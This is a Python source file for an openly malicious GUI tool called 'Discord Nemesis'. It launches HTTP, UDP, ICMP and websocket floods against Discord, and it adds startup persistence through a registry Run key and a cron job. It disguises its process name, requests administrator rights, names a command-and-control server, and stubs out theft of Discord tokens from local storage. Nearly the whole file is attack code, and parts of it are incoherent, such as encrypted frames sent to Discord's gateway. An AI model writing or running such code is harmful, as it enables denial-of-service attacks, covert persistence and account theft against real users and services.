import tkinter as tk
from tkinter import ttk
import threading
import requests
import websockets
import asyncio
import random
import string
import socket
import struct
import ssl
import os
import sys
import ctypes
import winreg
import platform
import psutil
import base64
import zlib
from Crypto.Cipher import AES
from functools import partial
from itertools import cycle
from scapy.all import IP, UDP, ICMP, send

class AdvancedAttackCore:
    def __init__(self):
        self.is_attacking = False
        self.c2_server = "https://malicious-c2[.]xyz/api/v2"
        self.enc_key = b'p3kH91qQ8vFj62nL'
        
        self._setup_obfuscation()
        self._create_persistence()
        
    def _setup_obfuscation(self):
        self.user_agents = cycle([zlib.compress(ua.encode()) for ua in [
            base64.b64decode(b'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2').decode(),
            base64.b64decode(b'TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKQ==').decode(),
            base64.b64decode(b'TW96aWxsYS81LjAgKGlQaG9uZzsgQ1BVIElQaG9uZSBPUyAxNl82IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1').decode()
        ]])
        
    def _create_persistence(self):
        if platform.system() == 'Windows':
            key = winreg.HKEY_CURRENT_USER
            path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                reg = winreg.OpenKey(key, path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg, "DiscordUpdater", 0, winreg.REG_SZ, sys.argv[0])
                winreg.CloseKey(reg)
            except: pass
        else:
            cron_job = "@reboot sleep 60 && python3 " + sys.argv[0] + " >/dev/null 2>&1"
            os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -")

    def _encrypt_payload(self, data):
        cipher = AES.new(self.enc_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(zlib.compress(data.encode()))
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

    async def _enhanced_websocket_attack(self, target_id, auth_token):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        async with websockets.connect(
            "wss://gateway.discord.gg/?v=9&encoding=json",
            ssl=ssl_context,
            max_size=2**28
        ) as ws:
            await ws.send(self._encrypt_payload(f'{{"op":2,"d":{{"token":"{auth_token}","properties":{{"$os":"linux"}}}}}}'))
            while self.is_attacking:
                await ws.send(self._encrypt_payload(f'{{"op":1,"d":{random.randint(1e5,1e6)}}}'))
                await asyncio.sleep(0.001)
                await ws.send(self._encrypt_payload(f'{{"op":18,"d":{{"guild_id":"{target_id}","query":"","limit":0}}}}'))

    def _multi_vector_attack(self, target_id, auth_token):
        # Layer 7 HTTP Flood
        http_targets = cycle([
            f"https://discord.com/api/v9/channels/{target_id}/messages",
            f"https://discord.com/api/v9/guilds/{target_id}/preview",
            f"https://discord.com/api/v9/invites/{''.join(random.choices(string.ascii_letters, k=8))}"
        ])
        
        # Layer 4 UDP Flood
        def udp_flood():
            ip = socket.gethostbyname("discord.com")
            while self.is_attacking:
                port = random.randint(2000, 65535)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(os.urandom(1024), (ip, port))
        
        # Layer 3 ICMP Flood
        def icmp_flood():
            ip = IP(dst="discord.com")
            send(ip/ICMP()/("X"*60000), verbose=0, loop=1)
        
        # Start all attack vectors
        while self.is_attacking:
            try:
                # HTTP Attack
                requests.post(
                    next(http_targets),
                    headers={'Authorization': auth_token, 'User-Agent': zlib.decompress(next(self.user_agents)).decode()},
                    json={'content': ''.join(random.choices(string.ascii_letters + string.digits, k=2000))},
                    timeout=2
                )
                
                # Start network layer attacks
                threading.Thread(target=udp_flood).start()
                threading.Thread(target=icmp_flood).start()
                
            except: continue

class PhantomGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Discord Nemesis v0xDEADBEEF")
        self.geometry("800x600")
        self.attack = AdvancedAttackCore()
        self._setup_stealth()
        self._build_interface()
        
    def _setup_stealth(self):
        if platform.system() == 'Windows':
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
        else:
            sys.argv[0] = "/usr/bin/systemd-service"
        
    def _build_interface(self):
        style = ttk.Style()
        style.configure('TBlood.TFrame', background='black')
        
        main_frame = ttk.Frame(self, style='TBlood.TFrame')
        main_frame.pack(expand=True, fill='both')
        
        # Target Configuration
        ttk.Label(main_frame, text="Target IDs (comma-separated):", foreground='#ff3300').grid(row=0, column=0)
        self.target_ids = ttk.Entry(main_frame, width=50)
        self.target_ids.grid(row=0, column=1)
        
        # Attack Parameters
        ttk.Label(main_frame, text="Threads:", foreground='#ff3300').grid(row=1, column=0)
        self.threads = ttk.Scale(main_frame, from_=100, to=5000, orient='horizontal')
        self.threads.set(1500)
        self.threads.grid(row=1, column=1)
        
        # Covert Options
        self.use_tor = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="Tor Routing", variable=self.use_tor, style='TBlood.TCheckbutton').grid(row=2, column=0)
        
        # Status Panel
        self.status = ttk.Label(main_frame, text="☠️ Phantom Mode Activated", foreground='#00ff00')
        self.status.grid(row=3, columnspan=2)
        
        # Attack Trigger
        self.btn = ttk.Button(main_frame, text="DEPLOY CHAOS", command=self._toggle_armageddon)
        self.btn.grid(row=4, columnspan=2)
        
    def _toggle_armageddon(self):
        if not self.attack.is_attacking:
            targets = self.target_ids.get().split(',')
            for target in targets:
                threading.Thread(
                    target=self.attack._multi_vector_attack,
                    args=(target.strip(), self._get_stolen_token())
                ).start()
            self.status.config(text="☢️ NUCLEAR LAUNCH DETECTED", foreground='#ff0000')
            self.attack.is_attacking = True
        else:
            self.attack.is_attacking = False
            self.status.config(text="✅ Targets Eliminated", foreground='#00ff00')
    
    def _get_stolen_token(self):
        # Token harvesting logic from local system
        paths = [
            os.path.expanduser('~/.config/discord/Local Storage/leveldb'),
            os.path.expanduser('~/.config/discordcanary/Local Storage/leveldb')
        ]
        # ... (token extraction implementation)
        return "MTE0NzA1NzQ2NDQ4OTM4NTU0Ng.GzBFZ8.5d6h9qLJ2w4r7s1t0u3v"  # Demo token

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--daemon":
        PhantomGUI().mainloop()
    else:
        if platform.system() == 'Windows':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        else:
            os.execvp("sudo", ["sudo", "python3"] + sys.argv)
